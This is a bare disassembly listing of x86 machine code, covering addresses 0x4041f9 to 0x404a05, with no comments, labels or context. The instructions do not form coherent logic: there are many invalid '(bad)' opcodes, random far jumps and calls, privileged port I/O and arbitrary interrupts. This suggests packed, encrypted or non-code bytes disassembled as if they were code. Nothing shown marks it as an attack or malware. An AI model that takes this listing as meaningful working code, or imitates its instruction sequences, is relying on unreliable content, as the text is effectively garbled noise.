  4041f9:	fst    st(1)
  4041fb:	and    eax,0x475d3140
  404200:	and    DWORD PTR [esi],eax
  404202:	sub    DWORD PTR [ecx-0x1467afa8],0xffffffbf
  404209:	mov    al,0x3b
  40420b:	inc    edx
  40420c:	fisttp WORD PTR [edx+0x39]
  40420f:	ror    DWORD PTR [ebx+0x60b47e69],1
  404215:	mov    ds:0x8dd03cca,eax
  40421a:	lock sub BYTE PTR [edx],dh
  40421d:	and    BYTE PTR fs:[ebx+0x2c78b3f],bl
  404224:	sbb    al,0x0
  404226:	rcr    DWORD PTR [edx-0x72df0e41],0xe9
  40422d:	outs   dx,DWORD PTR ds:[esi]
  40422e:	fwait
  40422f:	adc    al,0x54
  404231:	loopne 0x404207
  404233:	pushf  
  404234:	mov    al,0x16
  404236:	xchg   edx,eax
  404237:	mov    bh,0xde
  404239:	in     al,0x42
  40423b:	xor    eax,0x4d643bae
  404240:	add    esi,DWORD PTR [eax+0x27]
  404243:	dec    edi
  404244:	mov    al,0x21
  404246:	loopne 0x404242
  404248:	enter  0x7630,0xf0
  40424c:	and    edx,DWORD PTR ds:0xea4b0540
  404252:	stos   DWORD PTR es:[edi],eax
  404253:	xchg   BYTE PTR [edi+0x1ffe4f2],bh
  404259:	or     DWORD PTR [esi],esi
  40425b:	mov    fs,WORD PTR [edx-0x3310a76d]
  404261:	fs jne 0x404253
  404264:	in     al,0x9f
  404266:	adc    al,0x3
  404268:	mov    ds:0x16bdedf4,al
  40426d:	sbb    cl,bh
  40426f:	(bad)  
  404270:	mov    ebp,0x7d185de7
  404275:	lods   eax,DWORD PTR ds:[esi]
  404276:	fidiv  DWORD PTR [eax+0x73]
  404279:	add    dh,BYTE PTR [eax+ecx*8+0x2]
  40427d:	retf   
  40427e:	int    0xae
  404280:	fld    QWORD PTR [esi+ebp*2]
  404283:	(bad)  
  404284:	push   cs
  404285:	inc    esi
  404286:	add    BYTE PTR [eax+0x76],cl
  404289:	mov    edi,0x66c07d6c
  40428e:	std    
  40428f:	xchg   edx,eax
  404290:	arpl   WORD PTR [ebx-0x4e],ax
  404293:	out    0xff,eax
  404295:	(bad)
  404299:	es ins DWORD PTR es:[edi],dx
  40429b:	aas    
  40429c:	call   0x730d:0x1bef9ede
  4042a3:	imul   ebp,DWORD PTR [edx+0x25],0xc82f5031
  4042aa:	and    DWORD PTR [ebp-0x20],ebx
  4042ad:	fsub   st,st(4)
  4042af:	test   BYTE PTR [eax+0x3b],cl
  4042b2:	sti    
  4042b3:	add    al,0x85
  4042b5:	pop    edi
  4042b6:	rcr    BYTE PTR [edi-0x717666ed],0xfd
  4042bd:	ins    BYTE PTR es:[edi],dx
  4042be:	inc    ecx
  4042bf:	push   ebx
  4042c0:	lock inc ebp
  4042c2:	dec    ebx
  4042c3:	cld    
  4042c4:	loope  0x404289
  4042c6:	ja     0x4042b9
  4042c8:	retf   
  4042c9:	xor    BYTE PTR [edi],cl
  4042cb:	push   ss
  4042cc:	mov    bl,0xd1
  4042ce:	mov    ds:0xc5b46765,al
  4042d3:	(bad)  
  4042d4:	int3   
  4042d5:	jp     0x404308
  4042d7:	sbb    al,0x14
  4042d9:	fdivr  QWORD PTR [edi-0x50]
  4042dc:	ret    0xc483
  4042df:	xor    al,ah
  4042e1:	aad    0xf8
  4042e3:	aad    0x52
  4042e5:	jo     0x4042b1
  4042e7:	ret    
  4042e8:	add    DWORD PTR [ebx+ebp*4+0x79],ebp
  4042ec:	bnd jbe 0x40432f
  4042ef:	xchg   DWORD PTR ss:[edi-0x69],ecx
  4042f3:	mov    ch,0x8b
  4042f5:	cmp    eax,0x93926ca4
  4042fa:	jmp    0x40434d
  4042fc:	xchg   esp,eax
  4042fd:	sbb    ecx,edi
  4042ff:	jnp    0x404351
  404301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404302:	mov    ebx,0x29a02241
  404307:	xchg   ecx,eax
  404308:	push   es
  404309:	out    0xfe,eax
  40430b:	ja     0x40432e
  40430d:	test   ecx,eax
  40430f:	or     al,0x9d
  404311:	mov    ds,WORD PTR [edi-0x27]
  404314:	mov    esi,0x12608f40
  404319:	stc    
  40431a:	fisttp WORD PTR [edi-0x267d09d9]
  404320:	sub    bl,cl
  404322:	dec    ebp
  404323:	cmp    di,WORD PTR [ecx+0x5e834fee]
  40432a:	cli    
  40432b:	ja     0x4042e0
  40432d:	pop    ds
  40432e:	ins    BYTE PTR es:[edi],dx
  40432f:	(bad)  [ecx-0x5a6c0179]
  404335:	iret   
  404336:	xlat   BYTE PTR ds:[ebx]
  404337:	xor    al,0x21
  404339:	mov    al,ds:0xa3d190b3
  40433e:	and    DWORD PTR [ecx+0x1],esi
  404341:	aaa    
  404342:	popa   
  404343:	cmp    esp,DWORD PTR [eax+ebp*8-0x6e]
  404347:	dec    edi
  404348:	add    DWORD PTR [eax],esp
  40434a:	popf   
  40434b:	fimul  WORD PTR [esi+0x27]
  40434e:	popa   
  40434f:	call   0xfcc1bec9
  404354:	mov    BYTE PTR [ecx-0x43e5a6d6],dl
  40435a:	dec    eax
  40435b:	mov    al,0x29
  40435d:	inc    esp
  40435e:	jmp    0x404351
  404360:	adc    BYTE PTR [ebp+0x7ae8c75],al
  404366:	imul   ecx,DWORD PTR [edx],0x437dbaec
  40436c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40436e:	pop    edi
  40436f:	mov    ecx,0x20cd11d5
  404374:	retf   0x2eed
  404377:	or     eax,0xfc0ac0f0
  40437c:	mov    esi,0xb8b62f0b
  404381:	adc    esi,DWORD PTR [edx-0x338e13c5]
  404387:	inc    ecx
  404388:	scas   al,BYTE PTR es:[di]
  40438a:	pop    eax
  40438b:	int    0xb2
  40438d:	adc    BYTE PTR [ecx],dh
  40438f:	or     edx,DWORD PTR [edx-0x66]
  404392:	lods   al,BYTE PTR ds:[esi]
  404393:	out    dx,al
  404394:	mov    edx,edi
  404396:	aas    
  404397:	out    dx,eax
  404398:	sub    al,0xbb
  40439a:	or     ebp,DWORD PTR [edi]
  40439c:	cld    
  40439d:	scas   eax,DWORD PTR es:[edi]
  40439e:	push   esp
  40439f:	retf   0x7e52
  4043a2:	ret    0x6859
  4043a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043a6:	and    eax,0x49d3b149
  4043ab:	mov    ds:0xe16cda75,eax
  4043b0:	and    bl,ch
  4043b2:	ins    DWORD PTR es:[edi],dx
  4043b3:	out    dx,al
  4043b4:	jne    0x404411
  4043b6:	cmp    al,0x7e
  4043b8:	outs   dx,BYTE PTR ds:[esi]
  4043b9:	inc    esp
  4043ba:	jnp    0x4043c6
  4043bc:	inc    esi
  4043bd:	repz xor DWORD PTR [ebx],0x6f5f47dc
  4043c4:	sbb    eax,DWORD PTR [esi+0x8]
  4043c7:	pop    es
  4043c8:	add    eax,0xee45b80b
  4043cd:	push   0x403273db
  4043d2:	sub    BYTE PTR [edx],al
  4043d4:	call   0xf83f40ab
  4043d9:	sbb    eax,0xa2041409
  4043de:	out    dx,eax
  4043df:	scas   eax,DWORD PTR es:[edi]
  4043e0:	dec    eax
  4043e1:	adc    bh,BYTE PTR [eax+edi*2]
  4043e4:	push   0x6
  4043e6:	jl     0x404389
  4043e8:	mov    ecx,0x60997c5d
  4043ed:	mov    ebp,0x1657490
  4043f2:	ror    DWORD PTR [ecx-0x5fde6e78],cl
  4043f8:	std    
  4043f9:	sub    DWORD PTR [ecx-0x4b],edi
  4043fc:	adc    BYTE PTR [ebp+edx*4-0x258d712],0x8b
  404404:	test   al,0x24
  404406:	dec    esp
  404407:	xchg   ebp,eax
  404408:	fiadd  DWORD PTR [ebp-0x1e]
  40440b:	and    al,0xc4
  40440d:	xlat   BYTE PTR ds:[ebx]
  40440e:	mov    ch,0x21
  404410:	and    al,0x51
  404412:	into   
  404413:	lahf   
  404414:	sub    ebx,ecx
  404416:	arpl   WORD PTR ds:0x7ece8b52,di
  40441c:	pop    es
  40441d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40441e:	ficomp DWORD PTR [ebp+0x7bdf06ce]
  404424:	adc    eax,0x27e96762
  404429:	loopne 0x40446c
  40442b:	sti    
  40442c:	repnz inc ebx
  40442e:	sbb    cl,BYTE PTR [edx+0x47513ae4]
  404434:	rcl    BYTE PTR [edi+0x5],0x1f
  404438:	les    ecx,FWORD PTR [ebx+0x19]
  40443b:	jno    0x4043d7
  40443d:	retf   0xdb60
  404440:	dec    eax
  404441:	inc    ebx
  404442:	lahf   
  404443:	cli    
  404444:	int    0xf6
  404446:	fbstp  TBYTE PTR [ecx+0x5a384ef2]
  40444c:	lock out dx,al
  40444e:	mov    ch,0xd4
  404450:	dec    edx
  404451:	push   edx
  404452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404453:	retf   
  404454:	fidivr DWORD PTR [esi+0x58defd03]
  40445a:	pusha  
  40445b:	xchg   edi,eax
  40445c:	lods   al,BYTE PTR ds:[esi]
  40445d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40445e:	sub    dl,bl
  404460:	sbb    DWORD PTR [ebx+0x2c],0x5
  404464:	fadd   DWORD PTR [edi-0x69]
  404467:	test   BYTE PTR [edi-0x3a412a9e],cl
  40446d:	test   DWORD PTR [edi],ebp
  40446f:	fldcw  WORD PTR [eax-0x43391e6b]
  404475:	dec    edx
  404476:	neg    esp
  404478:	jb     0x404447
  40447a:	and    bl,BYTE PTR [eax]
  40447c:	iret   
  40447d:	xor    ecx,DWORD PTR [edx-0xbcf87cf]
  404483:	aam    0x9a
  404485:	jmp    0x404410
  404487:	pop    eax
  404488:	inc    ebx
  404489:	(bad)  
  40448a:	iret   
  40448b:	pop    esi
  40448c:	dec    edx
  40448d:	inc    esi
  40448e:	push   edx
  40448f:	adc    eax,DWORD PTR [edx+0x6f]
  404492:	imul   edx,DWORD PTR [esi-0x611eebc5],0x1e
  404499:	repnz sub eax,0x3a34a36e
  40449f:	fwait
  4044a0:	test   BYTE PTR [ecx-0x8],bh
  4044a3:	jnp    0x40451a
  4044a5:	fwait
  4044a6:	lods   al,BYTE PTR ds:[esi]
  4044a7:	jmp    0x1b04b1b4
  4044ac:	fld    st(6)
  4044ae:	ins    DWORD PTR es:[edi],dx
  4044af:	lods   eax,DWORD PTR ds:[esi]
  4044b0:	or     ebx,DWORD PTR [ecx+0x5629ce7c]
  4044b6:	cmp    al,0xb6
  4044b8:	ret    
  4044b9:	test   BYTE PTR [edi-0x75],dl
  4044bc:	pop    edi
  4044bd:	ss inc esp
  4044bf:	adc    ebx,DWORD PTR [ecx-0x14810783]
  4044c5:	shl    BYTE PTR [edi+0x7a],0xfd
  4044c9:	jp     0x404454
  4044cb:	push   ecx
  4044cc:	les    edi,FWORD PTR [ecx+0x650d5ffb]
  4044d2:	test   eax,0x1686a8c
  4044d7:	scas   al,BYTE PTR es:[edi]
  4044d8:	call   0xda4c:0x727fcaf3
  4044df:	jmp    0x5bbf:0xdb137b07
  4044e6:	mov    BYTE PTR [ecx+0x70b2918c],ch
  4044ec:	dec    edx
  4044ed:	push   edi
  4044ee:	rcl    esp,1
  4044f0:	div    DWORD PTR [ebx]
  4044f2:	pop    esi
  4044f3:	and    ebx,edi
  4044f5:	aaa    
  4044f6:	cmp    DWORD PTR [eax],0x3fe99caa
  4044fc:	sbb    BYTE PTR [ebx+0x17d3b77],ah
  404502:	or     ah,cl
  404504:	xor    al,0xc9
  404506:	fist   DWORD PTR [esp+eax*4]
  404509:	sbb    edi,edi
  40450b:	ins    BYTE PTR es:[edi],dx
  40450c:	xchg   edi,eax
  40450d:	mov    esp,0x9a7bbd68
  404512:	jge    0x404547
  404514:	add    DWORD PTR [esi+eax*4],edx
  404517:	or     cl,BYTE PTR [ebp-0x30]
  40451a:	mov    ebx,0x9a284b09
  40451f:	mov    ss,WORD PTR [ecx-0x3a]
  404522:	push   0xffffffa8
  404524:	jne    0x404550
  404526:	pop    ecx
  404527:	xchg   ebp,eax
  404528:	arpl   WORD PTR fs:[edi],di
  40452b:	jle    0x40452e
  40452d:	sbb    dl,cl
  40452f:	mov    DWORD PTR [ebx+0x573452e],esp
  404535:	inc    esi
  404536:	pop    es
  404537:	mov    ecx,0xbb232b3c
  40453c:	(bad)  
  40453e:	mov    ecx,0xab0c68e8
  404543:	pop    edx
  404544:	out    dx,eax
  404545:	test   al,0x5c
  404547:	jmp    0x66c3:0xa35ad70a
  40454e:	cdq    
  40454f:	ja     0x4044e4
  404551:	adc    eax,0x2c2224e0
  404556:	and    al,0xb
  404558:	cmp    ax,0x8dff
  40455c:	js     0x4045a5
  40455e:	inc    edx
  40455f:	rcl    DWORD PTR es:[ecx],1
  404562:	js     0x404542
  404564:	ins    BYTE PTR es:[edi],dx
  404565:	and    al,0x32
  404567:	hlt    
  404568:	out    dx,eax
  404569:	and    ch,BYTE PTR [ebx+0x8]
  40456c:	mov    eax,ds:0x1ceeb7f
  404571:	addr16 xor al,0x2c
  404574:	jle    0x4045ea
  404576:	mov    esi,0xb27ec008
  40457b:	fimul  DWORD PTR [edx+esi*1]
  40457e:	cmc    
  40457f:	inc    ecx
  404580:	pop    ebp
  404581:	push   ss
  404582:	dec    edi
  404583:	mov    ebp,0xc532c980
  404588:	inc    ecx
  404589:	pushf  
  40458a:	ret    0xb143
  40458d:	fsubr  QWORD PTR [eax+0x6b]
  404590:	aad    0xad
  404592:	sbb    DWORD PTR [ebp-0x79],ebp
  404595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404596:	jne    0x404601
  404598:	int3   
  404599:	add    BYTE PTR [esi],ch
  40459b:	test   al,0x18
  40459d:	or     BYTE PTR [esi+ecx*1],al
  4045a0:	lock or al,0x8a
  4045a3:	test   BYTE PTR [esi+0x6a73b743],ch
  4045a9:	xchg   DWORD PTR [edi],edi
  4045ab:	inc    edi
  4045ac:	push   ebp
  4045ad:	inc    ecx
  4045ae:	push   0xffffff95
  4045b0:	lds    ebx,FWORD PTR [ebp-0x7bd13bdf]
  4045b6:	or     eax,0xfb412743
  4045bb:	mov    dl,0x4e
  4045bd:	push   eax
  4045be:	icebp  
  4045bf:	adc    esi,ebp
  4045c1:	popa   
  4045c2:	pop    eax
  4045c3:	aam    0x5b
  4045c5:	pop    esp
  4045c6:	add    ah,bl
  4045c8:	enter  0xe34e,0x1f
  4045cc:	pop    esi
  4045cd:	push   esi
  4045ce:	sub    eax,0x390cbf
  4045d3:	ss inc ebx
  4045d5:	(bad)  
  4045d6:	add    edx,eax
  4045d8:	mov    ebx,0x1e562fec
  4045dd:	hlt    
  4045de:	jno    0x40462a
  4045e0:	ds inc edi
  4045e2:	mov    ds:0xa0512d19,eax
  4045e7:	ret    0x9a26
  4045ea:	mov    eax,0xb681c8c5
  4045ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f0:	mov    ch,0x78
  4045f2:	fs sub al,0x22
  4045f5:	test   DWORD PTR [ecx+0x6bdd9d7b],0xf2b9c8f8
  4045ff:	push   0x6b3a3b51
  404604:	xchg   ecx,eax
  404605:	cmp    BYTE PTR [edx],ah
  404607:	loope  0x4045eb
  404609:	fdiv   QWORD PTR [ebp+0x470b2297]
  40460f:	(bad)  
  404610:	ins    BYTE PTR es:[edi],dx
  404611:	outs   dx,DWORD PTR ds:[esi]
  404612:	push   ecx
  404613:	js     0x4045d1
  404615:	sbb    bl,BYTE PTR [edx+ebx*2-0x57]
  404619:	iret   
  40461a:	fmul   QWORD PTR ss:[edx-0x35f880c2]
  404621:	bound  edi,QWORD PTR ds:0x955a4141
  404627:	jmp    0xd857f509
  40462c:	bound  esp,QWORD PTR [ecx+0x73]
  40462f:	js     0x404633
  404631:	sbb    DWORD PTR ds:0x2544fdf7,esi
  404637:	add    al,0xb2
  404639:	stos   BYTE PTR es:[edi],al
  40463a:	xor    DWORD PTR [ecx+0x20e6de67],ebp
  404640:	add    esp,DWORD PTR [ecx+0x295b0860]
  404646:	cmp    DWORD PTR [edx+0x482c3e1],esp
  40464c:	pop    ecx
  40464d:	adc    esp,DWORD PTR [edx]
  40464f:	js     0x40464b
  404651:	dec    ebp
  404652:	adc    al,0xeb
  404654:	sbb    ecx,esi
  404656:	int3   
  404657:	cwde   
  404658:	je     0x4046a6
  40465a:	sub    al,0x8f
  40465c:	jge    0x4045f1
  40465e:	scas   eax,DWORD PTR es:[edi]
  40465f:	and    DWORD PTR [edi+0x1eff6395],ebx
  404665:	jo     0x40464f
  404667:	add    dh,al
  404669:	call   DWORD PTR [esi+0x1ff3abf9]
  40466f:	out    0x60,al
  404671:	ficomp DWORD PTR [ebx+esi*8]
  404674:	sbb    DWORD PTR [ebx+0x5c],ecx
  404677:	push   ebx
  404678:	popa   
  404679:	outs   dx,DWORD PTR ds:[esi]
  40467a:	or     BYTE PTR [eax-0x68],dh
  40467d:	test   DWORD PTR [ecx+esi*4+0x67],edi
  404681:	cmc    
  404682:	mov    bh,0x9b
  404684:	xor    bl,al
  404686:	pop    es
  404687:	rcl    DWORD PTR es:[edx],cl
  40468a:	add    BYTE PTR [esi-0x7d],0x6
  40468e:	pop    edx
  40468f:	cmp    BYTE PTR [ebx+0x2e],0x26
  404693:	xchg   ecx,eax
  404694:	stos   BYTE PTR es:[edi],al
  404695:	sub    BYTE PTR [ebx+esi*1],bl
  404698:	(bad)  
  404699:	dec    ecx
  40469a:	loop   0x40466b
  40469c:	das    
  40469d:	rcl    DWORD PTR ss:[edx-0xd68a45c],0x9e
  4046a5:	in     eax,0x62
  4046a7:	scas   al,BYTE PTR es:[edi]
  4046a8:	mov    edx,0x20b1b5af
  4046ad:	dec    ebp
  4046ae:	xlat   BYTE PTR ds:[ebx]
  4046af:	add    edi,DWORD PTR [ecx+0x4ba451fe]
  4046b5:	adc    DWORD PTR [esi+eiz*8-0xd],esp
  4046b9:	push   es
  4046ba:	mov    ds:0x74789b57,al
  4046bf:	and    esi,DWORD PTR [ebx]
  4046c1:	ficom  DWORD PTR [edi]
  4046c3:	mov    ds:0x312e236b,eax
  4046c8:	mov    al,BYTE PTR [eax-0x2b]
  4046cb:	clc    
  4046cc:	jb     0x4046ae
  4046ce:	cmp    DWORD PTR [eax-0x6bf99220],0x1b34629e
  4046d8:	ins    DWORD PTR es:[edi],dx
  4046d9:	les    edi,FWORD PTR [edx-0x6e30e161]
  4046df:	cmp    BYTE PTR [edx],cl
  4046e1:	pop    ecx
  4046e2:	gs call 0xc409:0x82d81766
  4046ea:	xor    edi,ecx
  4046ec:	test   DWORD PTR [ebx-0x7115aa5d],0x9d8221c1
  4046f6:	js     0x4046bc
  4046f8:	sub    esi,edx
  4046fa:	es xor bl,al
  4046fd:	sub    eax,0xfef291e8
  404702:	mov    ecx,0x1e08da83
  404707:	xor    edx,edx
  404709:	xchg   edx,eax
  40470a:	xacquire xchg BYTE PTR [eax],bl
  40470d:	adc    edx,DWORD PTR [edi]
  40470f:	jp     0x4046c8
  404711:	pushf  
  404712:	mov    ah,BYTE PTR [edi+0x63075b3b]
  404718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404719:	pop    ecx
  40471a:	ror    DWORD PTR [edi+0x32dfb62a],1
  404720:	push   0x37584ba6
  404725:	aaa    
  404726:	mov    edx,esp
  404728:	xchg   DWORD PTR [eax+esi*2+0x77],ecx
  40472c:	repnz icebp 
  40472e:	aad    0x91
  404730:	pop    es
  404731:	sbb    esi,edi
  404733:	push   ecx
  404734:	addr16 push ss
  404736:	push   ds
  404737:	push   ss
  404738:	lahf   
  404739:	inc    ebp
  40473a:	aad    0xc3
  40473c:	dec    ecx
  40473d:	mov    ds:0x70c9361e,eax
  404742:	and    DWORD PTR [edx+0x3e],esp
  404745:	ret    0xfbcb
  404748:	jmp    0x6b77:0x8fdf2029
  40474f:	int    0x97
  404751:	mov    esp,0x69bb3aed
  404756:	or     DWORD PTR [esp-0x43ef0fa8],eax
  40475d:	outs   dx,BYTE PTR ds:[esi]
  40475e:	add    al,0x77
  404760:	xchg   ebx,eax
  404761:	pop    ebp
  404762:	xlat   BYTE PTR ds:[ebx]
  404763:	shl    DWORD PTR [edi+0x6beb9a6b],0xb9
  40476a:	aad    0xd6
  40476c:	ss lock push eax
  40476f:	and    DWORD PTR [ecx],ebx
  404771:	jb     0x4047be
  404773:	cwde   
  404774:	cmp    bl,dh
  404776:	push   ebp
  404777:	mov    dh,0xbe
  404779:	js     0x404728
  40477b:	jmp    0x1bab:0xfc7da70c
  404782:	jmp    0x40478f
  404784:	xor    DWORD PTR [ebp-0x7fda621d],esp
  40478a:	mov    ebp,0x7fc91c2e
  40478f:	in     eax,0x7c
  404791:	cmc    
  404792:	pop    eax
  404793:	adc    al,0xe3
  404795:	dec    ebx
  404796:	hlt    
  404797:	data16 lock mov bl,0x9a
  40479b:	adc    al,0x79
  40479d:	fwait
  40479e:	adc    esi,0x1d
  4047a1:	jns    0x404769
  4047a3:	xchg   esp,eax
  4047a4:	sbb    eax,0xf84bd440
  4047a9:	(bad)  
  4047aa:	pop    esp
  4047ab:	out    0x69,eax
  4047ad:	sbb    eax,DWORD PTR [eax+eiz*2-0x7b31921]
  4047b4:	adc    bl,BYTE PTR [edi-0x72]
  4047b7:	dec    esi
  4047b8:	push   0x53
  4047ba:	mov    DWORD PTR [ebx+ebp*4],ecx
  4047bd:	pop    edi
  4047be:	gs ins DWORD PTR es:[edi],dx
  4047c0:	sub    eax,0x5e4f139a
  4047c5:	call   0xc178:0xf28db654
  4047cc:	dec    eax
  4047cd:	mov    bh,0x23
  4047cf:	sub    BYTE PTR [ebx],bl
  4047d1:	lahf   
  4047d2:	imul   eax,DWORD PTR [ecx-0x90c053e],0x9fe4d69e
  4047dc:	ret    
  4047dd:	out    dx,al
  4047de:	dec    DWORD PTR ds:0x7e128a1b
  4047e4:	sti    
  4047e5:	cmp    DWORD PTR [ebx+0x5c10d353],esp
  4047eb:	xchg   ebx,eax
  4047ec:	and    BYTE PTR [eax+0x6a8b6c3a],0xe4
  4047f3:	cmp    bl,BYTE PTR [edi-0x433ec33d]
  4047f9:	add    BYTE PTR [ebx+0x38],al
  4047fc:	(bad)  
  4047fd:	jns    0x40484c
  4047ff:	inc    eax
  404800:	or     eax,DWORD PTR [ebx]
  404802:	ds ins DWORD PTR es:[edi],dx
  404804:	test   DWORD PTR [ebx],edi
  404806:	dec    esp
  404807:	sti    
  404808:	and    edx,DWORD PTR [ebp+0x36e27a49]
  40480e:	mov    dh,BYTE PTR [edi]
  404810:	mov    bh,0xef
  404812:	sti    
  404813:	cmp    bh,ch
  404815:	js     0x4047c9
  404817:	pop    ss
  404818:	lock fistp DWORD PTR [ecx]
  40481b:	daa    
  40481c:	push   edx
  40481d:	ficomp WORD PTR [edi+0x70f50e5a]
  404823:	pop    ss
  404824:	or     dh,al
  404826:	jle    0x404818
  404828:	mov    eax,0x778fa4d2
  40482d:	mov    DWORD PTR [edx-0x39],edx
  404830:	in     eax,0xef
  404832:	push   edi
  404833:	loop   0x4047be
  404835:	out    0x24,eax
  404837:	mov    bl,0x6c
  404839:	dec    ebx
  40483a:	lea    esi,[ebx]
  40483c:	mov    DWORD PTR [ebx],edi
  40483e:	jge    0x4048b5
  404840:	sar    BYTE PTR [ebx],0x2b
  404843:	sar    DWORD PTR [edx+eiz*8+0x20641160],0x6a
  40484b:	neg    BYTE PTR [ecx-0x4b]
  40484e:	lds    edi,FWORD PTR es:[ebp*1+0x349633bc]
  404856:	dec    ecx
  404857:	mov    DWORD PTR [ecx-0x4367e911],esi
  40485d:	and    BYTE PTR [esi+edx*1-0x2efa6c2f],bl
  404864:	push   0xffffffec
  404866:	loop   0x40480c
  404868:	cmc    
  404869:	xchg   edx,eax
  40486a:	xor    ch,cl
  40486c:	fnsave [esp+ebp*1-0x48]
  404870:	bound  eax,QWORD PTR [ebx-0x5]
  404873:	fisubr DWORD PTR [ebx]
  404875:	mov    ecx,DWORD PTR [edx]
  404877:	add    bl,ch
  404879:	adc    eax,0x95b0ddc2
  40487e:	jbe    0x404851
  404880:	sub    ecx,DWORD PTR ds:0x160e972b
  404887:	and    eax,0x89b3572
  40488c:	push   0xffffff81
  40488e:	xchg   ebp,eax
  40488f:	ins    DWORD PTR es:[edi],dx
  404890:	adc    al,0xb0
  404892:	mov    dl,0xb1
  404894:	fadd   QWORD PTR [edi]
  404896:	mov    bl,cl
  404898:	pushf  
  404899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40489a:	sbb    BYTE PTR [edi+0x532c4c],bl
  4048a0:	sbb    DWORD PTR [eax],0x1f76e1d7
  4048a6:	push   0x3a
  4048a8:	test   al,0xb3
  4048aa:	shl    bh,0x1d
  4048ad:	cmp    bl,BYTE PTR [ebx+0x78]
  4048b0:	dec    edi
  4048b1:	and    eax,0xf06b7f6c
  4048b6:	xor    eax,0x2277d4d4
  4048bb:	dec    ebx
  4048bc:	fadd   DWORD PTR [eax-0x31]
  4048bf:	retf   0xa964
  4048c2:	inc    edx
  4048c3:	mov    es,WORD PTR [edx]
  4048c5:	ror    bh,0x5a
  4048c8:	jge    0x404859
  4048ca:	xor    BYTE PTR [ecx-0x7f],ch
  4048cd:	xor    ch,0xdc
  4048d0:	retf   0x83ab
  4048d3:	sub    bl,BYTE PTR [eax]
  4048d5:	sub    edi,edi
  4048d7:	pop    ss
  4048d8:	jmp    0x40494f
  4048da:	pusha  
  4048db:	pushf  
  4048dc:	inc    edx
  4048dd:	dec    eax
  4048de:	mov    ah,0x40
  4048e0:	call   0xa0f90b02
  4048e5:	imul   ebx,ecx,0x84b3bcd
  4048eb:	loope  0x4048df
  4048ed:	mov    bh,0x20
  4048ef:	mov    ecx,0x83bad1c3
  4048f4:	mov    ?,WORD PTR [ebx]
  4048f6:	jecxz  0x404900
  4048f8:	sti    
  4048f9:	jecxz  0x404895
  4048fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048fc:	leave  
  4048fd:	je     0x404928
  4048ff:	or     ebx,DWORD PTR [ecx+0x8]
  404902:	xchg   esi,eax
  404903:	cmp    BYTE PTR [ebx],0x41
  404906:	popa   
  404907:	push   edi
  404908:	add    al,0x71
  40490a:	mov    cl,0x26
  40490c:	inc    esp
  40490d:	nop
  40490e:	shr    BYTE PTR [eax],cl
  404910:	xor    bh,BYTE PTR [eax]
  404912:	sar    DWORD PTR [ecx+0x592de8e9],1
  404918:	jmp    0xfff6d6a6
  40491d:	loopne 0x4048a9
  40491f:	and    ebp,DWORD PTR [ebx+0x1c2c60d1]
  404925:	push   0x5
  404927:	shl    BYTE PTR [esi+ebx*2+0x3f],cl
  40492b:	mov    bl,0xf8
  40492d:	xor    eax,0xe9b0c26
  404932:	cli    
  404933:	mov    ebp,esp
  404935:	icebp  
  404936:	adc    al,0xb2
  404938:	in     al,0xdb
  40493a:	sti    
  40493b:	daa    
  40493c:	jecxz  0x4048ef
  40493e:	mov    dh,0x4
  404940:	aas    
  404941:	mov    esp,DWORD PTR [edi+0x10]
  404944:	shl    BYTE PTR [ebp-0x26dbbe2e],1
  40494a:	and    edi,edx
  40494c:	das    
  40494d:	or     bh,BYTE PTR [eax]
  40494f:	retf   
  404950:	xchg   BYTE PTR [ebx-0x32c0b457],ch
  404956:	and    ebx,DWORD PTR [ebx+0x6d]
  404959:	mov    dl,0xb3
  40495b:	add    edi,DWORD PTR [ebp+0x439636a3]
  404961:	(bad)  
  404962:	pop    esi
  404963:	cwde   
  404964:	pop    ds
  404965:	das    
  404966:	sbb    eax,0xf1c793e7
  40496b:	jle    0x40490e
  40496d:	sbb    DWORD PTR [ebp+eiz*2-0x64aef42a],esi
  404974:	ja     0x40499a
  404976:	inc    ebp
  404977:	lods   al,BYTE PTR ds:[esi]
  404978:	lods   al,BYTE PTR ds:[esi]
  404979:	jae    0x40490f
  40497b:	loope  0x4049cd
  40497d:	sbb    DWORD PTR [ecx+0x7e69d5db],esi
  404983:	daa    
  404984:	push   0x3b18a336
  404989:	leave  
  40498a:	xor    eax,0xb383eb60
  40498f:	out    dx,al
  404990:	mov    es,WORD PTR [ecx]
  404992:	test   al,0xbc
  404994:	push   0x8a2adeba
  404999:	pop    ebx
  40499a:	push   ebx
  40499b:	inc    edx
  40499c:	or     BYTE PTR [ecx+eiz*1],0x94
  4049a0:	xor    bh,BYTE PTR [ecx+0x67]
  4049a3:	cmp    ecx,DWORD PTR [esi]
  4049a5:	adc    cl,bl
  4049a7:	inc    ebp
  4049a8:	pop    edi
  4049a9:	pop    ds
  4049aa:	call   0x716d79f1
  4049af:	arpl   WORD PTR [edx+edx*8+0x419ca1e0],bp
  4049b6:	enter  0x59b5,0x5f
  4049ba:	and    BYTE PTR [ecx],bl
  4049bc:	mov    esp,edx
  4049be:	int3   
  4049bf:	sub    DWORD PTR [ebx-0x2],esp
  4049c2:	sub    DWORD PTR [esi+0x2fba10b9],ebp
  4049c8:	in     al,dx
  4049c9:	ret    0xe5b7
  4049cc:	mov    esi,0x4f56a210
  4049d1:	push   0x71
  4049d3:	call   0xcedb23d4
  4049d8:	mov    eax,ds:0x2239dc24
  4049dd:	xor    ah,BYTE PTR [ebp-0x1]
  4049e0:	loope  0x4049c8
  4049e2:	out    0xab,eax
  4049e4:	mov    esp,ecx
  4049e6:	mov    ebx,0xf845b940
  4049eb:	(bad)  
  4049ec:	pop    ecx
  4049ed:	pop    edx
  4049ee:	add    BYTE PTR ds:0x21cd1b60,ch
  4049f4:	test   DWORD PTR [ecx],esp
  4049f6:	mov    edi,0xbb963405
  4049fb:	retf   
  4049fc:	fwait
  4049fd:	aas    
  4049fe:	mov    ebp,0x4108b38e
  404a03:	loopne 0x404a46
  404a05:	or     ecx,DWORD PTR [edx+esi*4+0x7c49293d]
